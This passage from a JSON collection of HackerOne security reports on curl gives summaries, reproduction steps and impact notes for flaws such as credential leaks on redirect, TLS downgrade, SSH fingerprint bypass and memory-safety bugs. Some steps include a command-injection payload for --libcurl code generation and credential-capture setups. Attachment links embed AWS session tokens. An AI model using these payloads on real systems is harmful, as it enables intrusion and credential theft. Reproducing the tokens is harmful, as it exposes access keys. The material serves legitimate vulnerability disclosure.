    "original_report": "Summary:\n--------\n\nCurl doesn't consider IPv6 address zone index when doing connection reuse. if connection exists to specific IPv6 address (and other conditions for connection reuse are fulfilled) it will be reused for connections regardless of the zone index.\n\nSteps To Reproduce:\n-------------------\n\n1.Set up a fake server: `echo -ne 'HTTP/1.1 200 OK\\r\\nContent-Length: 6\\r\\n\\r\\nHello\\n' | nc -6 -v -l -p 9999`\n2. curl \"http://[ipv6addr]:9999/x\" \"http://[ipv6addr%25lo]:9999/y\"\n\nBoth connections arrive to the test server:\n\nClearly the 2nd connection should fail as the address is not available at interface lo. (Lone connection to `http://[ipv6addr%25lo]:9999/` fails with `curl: (7) Couldn't connect to server`)\n\nImpact\n------\n\nReuse of wrong connection leading to potential disclosure of confidential information.\n\nPractical impact of this vulnerability is very low, due to the rarity of situation where interfaces would have identical addresses. The attacker would also need to be able to manipulate the addresses the victim app connects to (making it first connect to interface controlled by the attacker).Finally, it doesn't seem likely that TLS would be used for such connections, making the scenario rather insecure to begin with.It seems likely that if the attacker has ability to set up interfaces with identical addresses they would have easier way to compromise the system anyway."
},
{
    "url": "https://hackerone.com/reports/1543773",
    "original_report": "Summary:\n--------\n\nCurl can be coaxed to leak user credentials to third-party host by issuing HTTP redirect to ftp:// URL.\n\nSteps To Reproduce:\n-------------------\n\n1. Configure for example Apache2 on `firstsite.tld` to perform redirect with mod\\_rewrite:\n2. Capture credentials at `secondsite.tld` for example with:\n3. `curl -L --user foo https://firstsite.tld/redirectpoc`\n4. The entered password is visible in the fake FTP server:\n\nThere are several issues here:\n\n1. The credentials are sent to a completely different host than the original host (`firstsite.tld` vs `secondsite.tld`). This is definitely not what the user could expect, considering the documentation says:\n   > When authentication is used, curl only sends its credentials to the initial host. If a redirect takes curl to a different host, it will not be able to intercept the user+password. See also --location-trusted on how to change this.\n2. The redirect crosses from secure context (HTTPS) to insecure one (FTP). That is the credentials are unexpectedly sent over insecure channels even when the URL specified is using HTTPS.\n\nI believe the credentials should not be sent in this case unless if `--location-trusted` is used.\n\nIt might even be sensible to consider making curl stop sending credentials over downgraded security by default even when `--location-trusted` is used. Maybe there could be some option that could be used to enable such downgrade if the user REALLY wants it.\n\nImpact\n------\n\nLeak of confidential information (user credentials)."
},
{
    "url": "https://hackerone.com/reports/1549435",
    "original_report": "Summary:\n--------\n\n`CURLOPT_SSH_HOST_PUBLIC_KEY_SHA256` base64 encoded host fingerprint is compared case-insensitive by accident. This means that it is technically possible (however still difficult) to create forged ssh host key that matches in this comparison.\n\nThe bug appears to have been introduced when adding `CURLOPT_SSH_HOST_PUBLIC_KEY_SHA256` support, and then copying the case insensitive comparison of the string for `CURLOPT_SSH_HOST_PUBLIC_KEY_MD5` (where it is appropriate since the MD5 fingerprint is a hex string).\n\nThis bug as added by commit <https://github.com/curl/curl/commit/d1e7d9197b7fe417fb4d62aad5ea8f15a06d906c>\n\nImpact\n------\n\nHost identify spoofing"
},
{
    "url": "https://hackerone.com/reports/1549461",
    "original_report": "Summary:\n--------\n\nDue to logic flaw in `CURLOPT_SSH_HOST_PUBLIC_KEY_MD5` handling, the host fingerprint validation will be bypassed if the passed a string that is not exactly 32 characters long.\n\nSteps To Reproduce:\n-------------------\n\n1. `curl_easy_setopt(curl, CURLOPT_SSH_HOST_PUBLIC_KEY_MD5, \"afe17cd62a0f3b61f1ab9cb22ba269a\"); // 31 chars`\n2. perform `sftp://` or `scp://` actions\n\nNote: `curl` command is not affected since it explicitly checks that the `--hostpubmd5` string is 32 characters long, and if it is not `PARAM_BAD_USE` is returned.\n\nThe bug is at <https://github.com/curl/curl/blob/f7f26077bc563375becdb2adbcd49eb9f28590f9/lib/vssh/libssh2.c#L733>\n\nIf the string length is other than 32 it should result in signature check failure instead of success. Obvious fix would be to remove the `if(pubkey_md5 && strlen(pubkey_md5) == 32)`test completely.\n\nImpact\n------\n\nSSH host identify bypass.\n\nFor this issue to be realised, a wrong size fingerprint needs to be passed (either by accident or by malice). It is likely that this is far more likely to happen by accident, since if some actor can tamper with the fingerprints they can bypass the validation anyway. Note that `curl_easy_setopt` `CURLOPT_SSH_HOST_PUBLIC_KEY_MD5` does not return an error indicating that something is wrong, hence this is breaking the principle of least surprise."
},
{
    "url": "https://hackerone.com/reports/1548535",
    "original_report": "Summary:\n--------\n\ncurl command `--libcurl` option can be tricked to generate C code that when compiled contains arbitrary code execution.\n\nSteps To Reproduce:\n-------------------\n\n1. `curl --libcurl client.c --user-agent \"??/\\\");char c[]={'i','d',' ','>','x',0},m[]={'r',0};fclose(popen(c,m));//\" http://example.invalid`\n2. `gcc -trigraphs client.c -lcurl -o client`\n3. `./client`\n4. `ls -l x`\n\nNote: In this PoC older compiler is simulated by passing `-trigraphs` option to gcc.\n\nTo remedy this issue `?` chars should be quoted to `\\?` in the generated strings.\n\nImpact\n------\n\nCode injection to generated source code.\n\nHowever, the impact of this vulnerability is minimal due to difficultly in finding scenarios where it would be practically exploitable. To be even remotely plausible curl command should somehow be hooked into a system that uses `--libcurl` to generate, compile and finally execute the compiled code *while* also accepting external user input for the curl command options. This seems extremely unlikely to happen in real life.\n\nTrigraph support has also largely been disabled by now (gcc and clang have it disabled by default at least).\n\nI don't really mind if this is found to be \"not a vulnerability\" (or only self-exploitable). In this case just close this H1 ticket and create a regular GitHub issue / or fix it direct."
},
{
    "url": "https://hackerone.com/reports/1542881",
    "original_report": "Summary:\n--------\n\nI'm using curl 7.82.0 on Linux. When the file specified by the -K option can't be read, curl sends network traffic as specified by the other options that are explicitly included on the command line (in other words, there's only a warning and I'd like it to be a fatal error). This behavior occurs even if those other options result in an action that's often considered unsafe, such as use of cleartext passwords. It's fine for curl to be capable of sending cleartext passwords, but this shouldn't happen unintentionally.\n\nI feel that this is a vulnerability in curl because curl is able to recognize that the user's intended set of options was not specified correctly, but curl still decides to send network traffic corresponding to the known subset of those options. One might argue that, philosophically, curl prefers to send network traffic even if the user's input is underspecified; however, this isn't true elsewhere in curl. For example, if the user misspells one of the options on the command line, curl doesn't simply ignore that one, and do whatever is specified by the remaining, correctly spelled options. Instead, any misspelled option is a fatal error, and curl sends no network traffic at all. My suggestion is to make this -K situation consistent with that, i.e., if the file specified by -K can't be read, then that is a fatal error and no network traffic is sent.\n\nSteps To Reproduce:\n-------------------\n\n1. Begin typing a curl command line that uses the -K option followed by a filename.\n2. Create the file with that filename.\n3. Within the file, include a curl option that is typically regarded as making network traffic more safe, e.g., the --ssl-reqd option.\n4. Ensure that the curl process cannot read this file.\n5. Enter the curl command.\n6. Observe that curl does **not** exit with an error message stating that the file can't be read.\n7. Observe that curl makes the network connection without the safety measure chosen in step 3.\n\nSupporting Material/References:\n-------------------------------\n\nA fatal error is the approach taken by many other programs in analogous cases, i.e., the program allows a security-relevant user-specified configuration file on the command line, and that file can't be read, e.g.,\n\nIn other words, ssh realizes it would be wrong to simply use the system-wide SSH client configuration when the user is clearly trying to use a different configuration. The tar program realizes it would be wrong to simply place every file into a public archive, when the user is clearly trying to use -X to exclude specific files. With curl, the user is clearly trying to add some options, which may perhaps be critical for security in that user's use case.\n\nHere's an example in which a curl user wishes to send secret credentials to an FTP server only if the FTP server supports SSL, analogous to the curl --ssl-reqd ftp://example.com example on the <https://curl.se/docs/manpage.html> page. The user chooses to use only a filename (named my-curl-ftp-options.config below), not a full pathname, with the -K option, just as in the curl --config file.txt <https://example.com> example on that page.\n\nThis example includes a user mistake, but the vulnerability is also relevant without any user mistake.\n\nSSL detection works fine if the user's current working directory contains the my-curl-ftp-options.config file. However, the user then makes the realistic mistake of changing to a different working directory without changing the -K value. (Here, the user goes to the /mnt/LargeVolume/user directory because it has much more disk space for storing the large FTP downloads.) Indeed, curl warns the user, but then immediately sends the unsafe network traffic.\n\nFor purposes of the example, ftp.dlink.de is used (it always demands a password, but all combinations of usernames and passwords succeed).\n\n### Part 1\n\n### Part 2\n\nIn Part 2, the cleartext network traffic exchanged begins with:\n\nIn Part 1, the network traffic exchanged is the following. The cleartext password is never sent:\n\nAs mentioned above, if the user had underspecified the desired network traffic by misspelling an option (e.g., the wrong spelling --ssl-required instead of the correct spelling -ssl-reqd), then there would be a fatal error, and no network traffic (such as a cleartext password) would be sent:\n\nIn a more realistic case, the user would not use ftp.dlink.de, but would instead use a series of FTP servers that are normally intended to support SSL. The user would want to place --ssl-reqd in a configuration file because it applies to every server. However, the user would want to place the username and password on the command line because they are different for every server.\n\nAn exploitation scenario (protocol downgrade attack) without a user mistake is:\n\n1. The victim user has a midnight cron job that is supposed to use curl for FTP with SSL. It has \"-K /home/user/ftp/my-curl-ftp-options.config\" on the command line; that file exists and contains a --ssl-reqd line.\n2. The curl binary is on local disk, but the user's home directory (including the /home/user/ftp/my-curl-ftp-options.config file) is on an NFS file server.\n3. The attacker is already able to disrupt availability (e.g., flood the NFS server for a few minutes at midnight to make it unresponsive) but has no way to disrupt the confidentiality or integrity of curl's use of SSL.\n4. Because /home/user/ftp/my-curl-ftp-options.config can't be read, curl doesn't know that SSL was desired, and thus sends the password in cleartext.\n5. The attacker can read the password off of the wire.\n\nThis vulnerability report is not specific to FTP or SSL. There are many other scenarios in which a missing option makes the network traffic less safe, and they add motivation for introducing a fatal error when the -K file can't be read. Some of the other scenarios are:\n\n* the user intended to have --digest in that file, and curl instead makes an HTTP request with a cleartext password\n* the user intended to have --append in that file, and curl instead overwrites the target file\n* the user intended to have --proxy (followed by the name of an anonymizing proxy server) in that file, and curl instead reveals the user's endpoint IP address to the server operator\n\nImpact\n------\n\nIn the main example above, the attacker can discover a cleartext password. More generally, the attacker can achieve any security impact that **any** curl option was trying to prevent. For example, the victim's source IP address may be leaked if the curl option was to use a proxy server. The connection may honor a revoked certificate if the curl option was to specify a local file with a Certificate Revocation List. Several others may also be relevant depending on the protocols and threat model."
},
{
    "url": "https://hackerone.com/reports/1521610",
    "original_report": "Summary:\n--------\n\nCurl remains in infinite loop with suitable MQTT server response.\n\nSteps To Reproduce:\n-------------------\n\n### Step 1:\n\nRun the following on linux with the attached file \"poc\" :\n\n### Step 2:\n\nUse curl:\n\n### Step 3:\n\nObserve output of \"top\".\n\nSupporting Material/References:\n-------------------------------\n\n[list any additional material (e.g. screenshots, logs, etc.)]\n\n* [poc (F1667277)](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/swfqytpv7n2fexpjfv7v7n5p1i41?response-content-disposition=attachment%3B%20filename%3D%22poc%22%3B%20filename%2A%3DUTF-8%27%27poc&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ6W3IRUM%2F20250927%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250927T030159Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEBAaCXVzLXdlc3QtMiJIMEYCIQDX0VPi1VrQP%2FHK77v%2BE1xLQ9WCEputN3n%2BG7sxZFqQ3QIhAPT8neWRAs%2BtpCsHACMYobyZ%2FjnvzG0orcUmfcTTJ3kRKrsFCJj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igz4JrQyCIQ6qOiWO9wqjwVAxIs2WF4kx8TQDddi9ua9WNj2HwvODQ8QaWNdnb%2B9tQ4PgH0nf6rP6engLxvB2CcVj70BpSBARHwioGbSam4vyrBkdiGAsm2oOm30r3EhiUFw7s%2BjqoDHSQvVR7Fv26a1gXhR9BhV1u2u%2B1apH8GLDisn5HxPX%2FZCZ7yfjfC9JD%2B8EmC%2FLo9pzBh6qZAMZ7iHSfMCTdXemfb5i9Wz79shGBZ%2BRqqYF2Q%2FC8nQjZE1orDpqYMs6Btme%2FzctUa80qFrs3MkYMR%2BgGt3mjCk4c%2BgQ4iVRoOUpU3kv0QXr69lMfIBR6MiOOowhXhWhc%2Bn8iksuukRcA8Xtm4ZlvXE95y%2Fq3ILke2INXcCFQcbairJIyxorcINvcl5AF%2B5cVJ6gmGwMEdjcZrXmR%2BnWggmi6ccvmubwGyNZBY9pdHWj2cDrVZYJeMA4CTJfxJw6ycRxzsi3eAtPFSyQUIVw7hg%2Fm4Qtupx02liORvxjWsMoyMeYD2ahHmDfvq5ryLQzWZFQ3UDu9dDEL0RF%2BaSD62h4w6jqNZsdIX5qHb1rXWsyD4rPAD8cJWePuvQku0R6DxsUqDkIhG2HnsxLpon2cN%2B07F86fhVy5rJ1LNiLkHMFAGDxyt7iffRmbv%2FBABJiQnnQSItfv6FRc1CCclB4Fgrnn8GEwoy4BJYn%2F6Ex0UjgfrzhChckM97pIaRm3v2z1Z503jZuMhc%2FOxPFzq2Vw52XWeaC%2Bdr%2FUoDtSwzs8m0aW1CLGQPqrIvjVQ7zu98%2BaZpg9HEPJJnNHx6%2FC9AwWlvvnvO6m52a5UmTk9N03hE57BBEERc2xWlycKpX39YjwsUWl5T5XStWkvuDLFBqFbylCoqTKs9tG3s9hPdVPfaXX7sMLK%2B3MYGOrABriGC4ngEP%2FSxR0zz9SXM41PAGC3SyKnEDzCiQrbyakpeig6K%2FxiWfQiBNim%2BR0eAf77Y4jkANAKcbYucGydZUBLbGCyvxEOyVMy5B1W56pjVgREOFqQceaEVgNwuAM0L4hR%2BpAuBM6jA5dIaQWgsnnWGMi370rFmCcgM6EsvDS7Pb0iAiG3C5VmsbEM1fPhQESh5%2Bqf6rYcMz45bQbuToGl%2B7vRLbg%2FKzzD9a2OYW4k%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=738e78be84009b2ec0cfaf2a2701e1b4d9ca0dab8761d28c6899e6ee0def0963) (poc file to host for curl to access)\n* [top.PNG (F1667276)](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/djkhfsgjky4e1i2i8cu7ufrl79ih?response-content-disposition=attachment%3B%20filename%3D%22top.PNG%22%3B%20filename%2A%3DUTF-8%27%27top.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ6W3IRUM%2F20250927%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250927T030159Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEBAaCXVzLXdlc3QtMiJIMEYCIQDX0VPi1VrQP%2FHK77v%2BE1xLQ9WCEputN3n%2BG7sxZFqQ3QIhAPT8neWRAs%2BtpCsHACMYobyZ%2FjnvzG0orcUmfcTTJ3kRKrsFCJj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igz4JrQyCIQ6qOiWO9wqjwVAxIs2WF4kx8TQDddi9ua9WNj2HwvODQ8QaWNdnb%2B9tQ4PgH0nf6rP6engLxvB2CcVj70BpSBARHwioGbSam4vyrBkdiGAsm2oOm30r3EhiUFw7s%2BjqoDHSQvVR7Fv26a1gXhR9BhV1u2u%2B1apH8GLDisn5HxPX%2FZCZ7yfjfC9JD%2B8EmC%2FLo9pzBh6qZAMZ7iHSfMCTdXemfb5i9Wz79shGBZ%2BRqqYF2Q%2FC8nQjZE1orDpqYMs6Btme%2FzctUa80qFrs3MkYMR%2BgGt3mjCk4c%2BgQ4iVRoOUpU3kv0QXr69lMfIBR6MiOOowhXhWhc%2Bn8iksuukRcA8Xtm4ZlvXE95y%2Fq3ILke2INXcCFQcbairJIyxorcINvcl5AF%2B5cVJ6gmGwMEdjcZrXmR%2BnWggmi6ccvmubwGyNZBY9pdHWj2cDrVZYJeMA4CTJfxJw6ycRxzsi3eAtPFSyQUIVw7hg%2Fm4Qtupx02liORvxjWsMoyMeYD2ahHmDfvq5ryLQzWZFQ3UDu9dDEL0RF%2BaSD62h4w6jqNZsdIX5qHb1rXWsyD4rPAD8cJWePuvQku0R6DxsUqDkIhG2HnsxLpon2cN%2B07F86fhVy5rJ1LNiLkHMFAGDxyt7iffRmbv%2FBABJiQnnQSItfv6FRc1CCclB4Fgrnn8GEwoy4BJYn%2F6Ex0UjgfrzhChckM97pIaRm3v2z1Z503jZuMhc%2FOxPFzq2Vw52XWeaC%2Bdr%2FUoDtSwzs8m0aW1CLGQPqrIvjVQ7zu98%2BaZpg9HEPJJnNHx6%2FC9AwWlvvnvO6m52a5UmTk9N03hE57BBEERc2xWlycKpX39YjwsUWl5T5XStWkvuDLFBqFbylCoqTKs9tG3s9hPdVPfaXX7sMLK%2B3MYGOrABriGC4ngEP%2FSxR0zz9SXM41PAGC3SyKnEDzCiQrbyakpeig6K%2FxiWfQiBNim%2BR0eAf77Y4jkANAKcbYucGydZUBLbGCyvxEOyVMy5B1W56pjVgREOFqQceaEVgNwuAM0L4hR%2BpAuBM6jA5dIaQWgsnnWGMi370rFmCcgM6EsvDS7Pb0iAiG3C5VmsbEM1fPhQESh5%2Bqf6rYcMz45bQbuToGl%2B7vRLbg%2FKzzD9a2OYW4k%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ac3d297048141ae4005b2d8ae780f896efaf81543df62bdfc9a7edf3e7a94b3e) (screen capture of top)\n\nDebugging Notes:\n----------------\n\nDebug trace output before going to the loop:\n\nThis section of lib/multi.c looks suspicious (line 2132 points here before entering the loop):\n\nCredits\n-------\n\nJenny Heino and Antti Levomäki from Forcepoint\n\nImpact\n------\n\nAttacker can cause a Denial of Service by delivering malicious content behind a MQTT URL. For example internet crawlers could be affected, or any other implementations automatically fetching provided URLs using curl."
},
{
    "url": "https://hackerone.com/reports/1485379",
    "original_report": "Summary:\n--------\n\nIt was observed that application is using strcpy() function which may cause buffer overflow attacks.\n\nAffected Code\n=============\n\n<https://github.com/curl/curl>\n\nAffected Lines\n==============\n\n1. Line 195 of curl-master\\tests\\libtest\\stub\\_gssapi.c\n2. Line 204,212,216 curl-master\\tests\\server\\socksd.c\n\nSteps To Reproduce:\n-------------------\n\nLets first discuss what is the issue with strcpy function. basically it takes 2 arguments 1 dst 2 source. the issue is if the dst size is small and the source size is more without a null terminating value so it will overwrite the memory. so in these case 1 got the several lines about strcpy function. but i'm discussing 1 with you rest with remain the same.\n\nelse if(!strcmp(key, \"backend\")) {\nstrcpy(config.addr, value);\n\nelse if(!strcmp(key, \"password\")) {\nstrcpy(config.password, value);\n\nchar addr[32]; / *backend IPv4 numerical* /\nchar user[256];\nchar password[256];\n\nhere it is copying the value into config.addr and the size of addr is 32 and same goes for password is 256. now let suppose the value of value is more than 32 in case of add and in case of password it is more than 256. than it can be buffer overflow attack here. so here it will be secure if you use the functions like snprintf , strlcpy. or dynamically assign the size to the array.\n\nSupporting Material/References:\n-------------------------------\n\n<https://cwe.mitre.org/data/definitions/676.html>\n<https://www.geeksforgeeks.org/why-strcpy-and-strncpy-are-not-safe-to-use/>\n\nRecommendation:\n===============\n\nIt is recommended to use below mentioned functions to avoid buffer overflow attacks\n\n1. snprintf\n2. strlcpy\n\n* [attachment / reference]\n  Please find the attached screenshots for your reference.\n\nImpact\n------\n\nThe strcpy() function does not specify the size of the destination array, so buffer overrun is often a risk. Using strcpy() function to copy a large character array into a smaller one is dangerous, but if the string will fit, then it will not be worth the risk. If the destination string is not large enough to store the source string then the behavior of strcpy() is unspecified or undefined."
},
{
    "url": "https://hackerone.com/reports/1468962",
    "original_report": "Binary output check bypass\n\nSummary:\n--------\n\nWhen curl outputs content, it checks for binary output. If the output is large enough, it bypasses the check for binary output. This can mess with the terminal.\n\nSteps To Reproduce:\n-------------------\n\n1. Setup a server of your choice.\n2. Create a function f with these arguments: char and num. Num is number of characters repeating.\n3. Before serving at a given endpoint, create an offset f(\".\", 16384)\n4. Create the payload with unicode 0x0 like this f(\"unicode 0x0\", 1)\n5. Make the server serve this at a given endpoint.\n6. Run this command: curl \"Accept: application/xml\" -H \"Content-Type: application/xml\" http://localhost:8080/yourendpoint\n7. Change the offset f(\".\", 16384) to f(\".\", 16383) to check if it worked.\n\ncurlpayload.png is the code\nexecution.png is output for when it worked\nfailed.png is when it failed, when I changed the offset to 16383\n\nImpact\n------\n\nThere could be some further impact by this exploit. As of now it can make the terminal really buggy at times, but further implementations could lead to something else."
},
{
    "url": "https://hackerone.com/reports/1463013",
    "original_report": "We are seeing the use of a `struct connectdata *` on a thread after it was returned to the connection cache (and thus available for use on other threads including potential deallocation) in `multi_done()` in libcurl-7.81.0. This could occasionally result in an actual use-after-free, witnessed on Windows 10 platform.\n\nSteps To Reproduce:\n-------------------\n\n* [`multi_done()` line 717](https://github.com/curl/curl/blob/curl-7_81_0/lib/multi.c#L717) a call is made to `Curl_conncache_return_conn()`\n* `Curl_conncache_return_conn()` returns `TRUE` (conn was returned to the cache and available for use in other threads) and execution continues on [line 719](https://github.com/curl/curl/blob/curl-7_81_0/lib/multi.c#L719) where the code derefs the now unowned `conn` to get the `connection_id`\n* We have a fork with a [commit](https://github.com/luminixinc/curl/commit/e8560cb3a2aa0c104d1afcc77490b70bad1ce9cd) that both tests (inline, not formally) and offers a potential fix for this issue.\n* See attached screenshot showing assert firing in debug build\n\nImpact\n------\n\nUnsure.\n\nI'm not a hacker, and would have been happy to submit this as a GitHub issue instead, but *discretion being the better part of valor*, decided to post this issue here instead :)\n\nTangentially, I do not care to get credit or receive a bounty for this issue. Would be great to get this fixed as I suggested or in some other manner, thanks!"
},
{
    "url": "https://hackerone.com/reports/1444539",
    "original_report": "Remote memory disclosure vulnerability in libcurl on 64 Bit Windows\n===================================================================\n\nSummary:\n--------\n\n`libcurl` (latest) contains a vulnerability that enables attackers to\nremotely read memory beyond the bounds of a buffer in the style of the\ninfamous \"heartbleed\" vulnerability. Luckily, however, this is only\npossible when `libcurl` runs on 64 bit Windows and it requires an\nattacker capable of influencing the size of a file upload part.\n\nThe core of the problem is the following: while on 64 Linux and BSD\nsystems, `sizeof(long)` is 8, on 64 bit Windows, it\nis 4. Consequently, the function `AddHttpPost` carries out an integer\ntruncation and sign conversion on these systems, as the parameter\n`bufferlength` of type `size_t` (8 byte wide, unsigned) is assigned to\nthe field `post->bufferlength` of type `long` (4 byte wide,\nsigned). The following excerpt shows the corresponding code:\n\nIn particular, this function is triggered when constructing an HTTP\nPOST request that specifies custom file upload parts, e.g., with a\nstatement such as the following:\n\nAn attacker capable of choosing the file to upload may choose for it\nto be 4294967295 in size, and, indeed, `libcurl` will transfer this\nfile without trouble on 64 bit Linux. On 64 bit Windows, however, this\nleads to `post->bufferlength` being -1 due to the\ntruncation/sign-conversion, which happens to also be the value of the\nconstant `CURL_ZERO_TERMINATED`. On posting the data, this undesirable\ninterpretation causes the function `curl_mime_data` to assume that the\nlength of the buffer to upload is not known and should be determined\nvia `strlen`. Assuming the buffer does not contain zero bytes - and in\nfact, the documentation states that it MAY NOT contain zero bytes,\n`strlen` will read beyond the bounds of the buffer `buffer`, and\nsubsequently transmit the buffer contents AND memory behind it to the\nHTTP server.\n\nThe following (commented) excerpt of `curl_mime_data` illustrates this\nbehavior:\n\nSteps To Reproduce:\n-------------------\n\nTo further illustrate the problem, I have created a sample application\nfor which the string \"secret\" is located directly after the\nto-be-transmitted buffer. On 64 bit Linux, the program correctly\ntransmits only the contents of the buffer. On 64 bit Windows, it\ntransmits the buffer contents and the string \"secret\". Logging network\ntraffic using `tcpdump`, this has been confirmed as the attached\nscreenshots show.\n\nThe following is the sample program (test.c), which compiles both on Linux\nand Windows (Visual Studio 2022 Community Edition).\n\nAs suggested patch would be to use the type `long long` as opposed to\n`long` for the buffer length. `long long` is guaranteed to be 8 byte\nwide on Linux and Windows 64 bit systems.\n\nImpact\n------\n\nAn attacker could read memory from the process remotely, meaning that any information processed by the program using libcurl may be disclosed. Depending on the application, this information may be sensitive, e.g., passwords, keys could be in memory. In addition, reading memory offsets may be useful to identify memory mappings remotely in preparation for a memory corruption exploits that requires bypassing of ASLR."
},
{
    "url": "https://hackerone.com/reports/1334111",
    "original_report": "Summary:\n--------\n\nIn imap and pop3, --ssl-reqd is silently ignored if the capability command failed.\nIn ftp, a non-standard 230 response (preauthentication?) in the greeter message forces curl to continue unencrypted, even if TLS has been required.\n\nSteps To Reproduce:\n-------------------\n\nUse a parameterizable test server to fail capability command for imap (CAPABILITY reply: A001 BAD Not implemented) and pop3 (CAPA reply: -ERR Not implemented) and to send response code 230 in FTP server greeting message.\n\n1. curl --ssl-reqd imap://server/...\n2. curl --ssl-reqd pop3://server/...\n3. curl --ssl-reqd --ftp-ssl-control ftp://server/...\n\nThese 3 commands are successsful, but network sniffing shows that TLS is never negotiated.\n\nImpact\n------\n\nA MitM can silently deny mandatory TLS negotiation and thus sniff and/or update unencrypted transferred data."
},
{
    "url": "https://hackerone.com/reports/1334763",
    "original_report": "Summary:\n--------\n\nA man-in-the-middle can inject cleartext forged responses to future encrypted commands by pipelining them to the STARTTLS response.\n\nSteps To Reproduce:\n-------------------\n\nUse the attached test case within the curl test system. It is based on IMAP FETCH with explicit TLS. Upon test failure, the downloaded file contains \"You've been hacked!\" rather than the requested mail.\n\nImpact\n------\n\nMailbox content forgery (IMAP, POP3).\nSent mail content forgery (SMTP)."
},
{
    "url": "https://hackerone.com/reports/1269242",
    "original_report": "Vulnerability Description\n=========================\n\nlibcurl version 7.77.0 has a [Use-After-Free](https://github.com/curl/curl/blob/curl-7_77_0/lib/mqtt.c#L559) and a [Double-Free](https://github.com/curl/curl/blob/curl-7_77_0/lib/mqtt.c#L560) in `lib/mqtt.c` in the function `mqtt_doing` on [lines 556 - 563](https://github.com/curl/curl/blob/curl-7_77_0/lib/mqtt.c#L556):\n\nAs can be seen in the code above `mq->sendleftovers` gets freed in line 560 but not set to `NULL`. If `mqtt_doing` gets called repeatedly and the values of `mq->nsend` and `mq->sendleftovers` don't change this can result in\n\n1. Sending the metadata of the freed chunk over the network via `mqtt_send`\n2. Freeing `mq->sendleftovers` multiple times\n\n`mq->nsend` and `mq->sendleftovers` get set in the function `mqtt_send` if `Curl_write` cannot send all bytes in the write-buffer at once. This can e.g. happen if `write()` returns `EAGAIN` or `EWOULDBLOCK`. Then `Curl_write` sets the number of written bytes to `0` and returns `CURLE_OK`.  \nThis can trigger the vulnerabilities as follows:\n\n1. Supply an `mqtt://` URL to curl\n2. Have some successfull transmissions with `mqtt_send`\n3. At some point have an unsuccessfull transmission such that not all bytes of the write-buffer can be sent.\n   This causes `mq->sendleftovers` and `mq->nsend` to be set.\n4. Have another invocation of `mqtt_doing`. The code mentioned above gets executed. `mq->sendleftovers` gets freed.\n   If `mqtt_send` could send all remaining bytes successfully `mq->sendleftovers` and `mq->nsend` don't get reset.\n5. Have another invocation of `mqtt_doing`. Since `mq->nsend` didn't change curl tries to send the leftover bytes again, triggering the vulnerabilities\n\nHow to reproduce the bug\n========================\n\n1. Checkout tag `curl-7_77_0` in the curl repository\n2. Apply the following patch that artificially creates a scenario as described above:\n\n3. Rebuild curl\n4. Start a simple netcat session with: `nc -lp 5678`\n5. Invoke curl with: `curl mqtt://127.0.0.1:5678/`\n\nThe output:\n\nAnd in the terminal where netcat was launched it can be seen\nthat the content of the freed heap chunk was sent.\n\nImpact\n------\n\nSince double frees of tcache chunks are not detected until glibc version 2.29\nthis vulnerability is perfectly exploitable for operationg systems using an older\nglibc. Causing `write()` to return `EAGAIN` is more difficult but not impossible\nto manage, e.g. this can always be the case if the peer is not reading as fast as\nthe curl client is writing ([source](https://stackoverflow.com/questions/36539580/write-to-tcp-socket-keeps-returning-eagain/36539632#36539632)).\nAt minimum this can be used to leak heap metadata which can help in exploitation."
},
{
    "url": "https://hackerone.com/reports/1223882",
    "original_report": "Summary:\n--------\n\n[CVE-2021-22898](/hacktivity/cve_discovery?id=CVE-2021-22898): TELNET stack contents disclosure ([#1176461](/reports/1176461)) issue was recently reported for curl and it was addressed in curl 7.77.0:\n\n<https://curl.se/docs/CVE-2021-22898.html>\n<https://github.com/curl/curl/commit/39ce47f219b09c380b81f89fe54ac586c8db6bde>\n<https://hackerone.com/reports/1176461>\n\nHowever, the fix applied is not correct and does not completely address the issue. It helps in cases when long environment variable name is used (`'a'*256 + ',b'`), but not when the name is short and only the value is long (`'a,' + 'b'*256`, which is the example mentioned in the curl project advisory).\n\nSteps To Reproduce:\n-------------------\n\nFollow the steps form [#1176461](/reports/1176461), only use NEW\\_ENV option with short name and long value, such as:\n\nSupporting Material/References:\n-------------------------------\n\nWhen parsing NEW\\_ENV option value with short name and long value, sscanf() returns 2, as it writes to both `varname` and `varval`, even though the data in `varval` is truncated. Hence such variable is not skipped and is added to the `temp[]` buffer. However, the `len` counter which tracks the amount of data that was already written to `temp[]` is not updated based on the data written to the buffer in the `msnprintf()`call, but rather based on the length of the original unparsed data that is stored in `tmplen`. The relevant code is here:\n\n<https://github.com/curl/curl/blob/curl-7_77_0/lib/telnet.c#L926-L929>\n\nWhen value stored in `varval` is truncated, `len` is increased too much and a chunk of uninitialized memory is created in `temp[]`. The `len` should only be incremented by `strlen(varname) + strlen(varval) + 2`.\n\nI wonder if the original fix should be preserved or re-worked. In addition to not fixing the info leak problem properly, it also causes certain valid option values to be ignored and not sent to a server any more. Rejected values are of the forms `NEW_ENV=a` or `NEW_ENV=a,`. At least the second one seems like an obviously valid way to set variable `a` to an empty string. RFC 1572 defines that environment variable can be sent with empty value and hence `NEW_ENV=a,` should remain supported. It also defines that variable can be sent with no value, making `NEW_ENV=a` a valid option as well. Note that curl prior to 7.77.0 actually did handle `NEW_ENV=a` that way, but it looks more like an unintended side effect of how `len` was incremented by `tmplen`, as the empty value part was written to `temp[]` and only subsequently overwritten. As the telnet protocol support in curl is not likely to be used widely these days, possibly only to interact with some legacy systems, it seems reasonable to prefer a fix that changes behaviour as little as possible.\n\nImpact\n------\n\nLeak of an uninitialized stack memory.\n\nReport [#1176461](/reports/1176461) and the matching curl advisory provide some estimates on how much data can be leaked. I believe the amount of leaked data is smaller and is less than a half of the 